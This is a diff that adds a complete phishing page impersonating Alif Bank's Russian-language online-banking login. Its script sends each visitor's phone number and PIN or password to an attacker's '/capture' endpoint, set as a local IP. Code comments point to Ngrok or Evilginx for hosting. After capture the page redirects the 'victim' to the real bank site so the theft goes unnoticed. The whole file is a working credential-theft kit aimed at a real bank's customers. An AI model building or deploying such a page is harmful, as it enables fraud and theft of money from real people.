@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alibank - Вход в онлайн</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d32f2f; /* Красный цвет Алиф */
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #b71c1c;
+        }
+        .status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: gray;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="logo">Alif Bank</div>
+    <h2>Вход в онлайн-банк</h2>
+    <form id="loginForm">
+        <input type="text" id="phone" placeholder="Номер телефона (992...)" required>
+        <input type="password" id="password" placeholder="ПИН-код или пароль" required>
+        <button type="submit">Войти</button>
+    </form>
+    <div class="status" id="status">Ожидание...</div>
+</div>
+
+<script>
+    // Твой локальный IP адрес (замени на свой, если знаешь)
+    // Если ты используешь Ngrok или другой туннель, вставь его URL здесь
+    const PROXY_IP = 'http://192.168.1.100:8080'; 
+    // Или, если ты запускаешь Evilginx на том же ПК и открываешь GitHub с того же IP:
+    // const PROXY_IP = window.location.hostname; 
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const phone = document.getElementById('phone').value;
+        const password = document.getElementById('password').value;
+
+        const statusEl = document.getElementById('status');
+        statusEl.textContent = 'Отправка данных...';
+
+        // Отправляем данные на твой прокси-сервер
+        fetch(`${PROXY_IP}/capture`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                phone: phone,
+                password: password,
+                timestamp: new Date().toISOString()
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                statusEl.textContent = 'Данные приняты! Перенаправление...';
+                // Имитируем успешный вход и перенаправляем жертву на реальный сайт Алиф
+                setTimeout(() => {
+                    window.location.href = 'https://online.alif.tj/';
+                }, 1500);
+            } else {
+                statusEl.textContent = 'Ошибка соединения.';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            statusEl.textContent = 'Ошибка. Попробуйте снова.';
+        });
+    });
+</script>
+
+</body>
+</html>
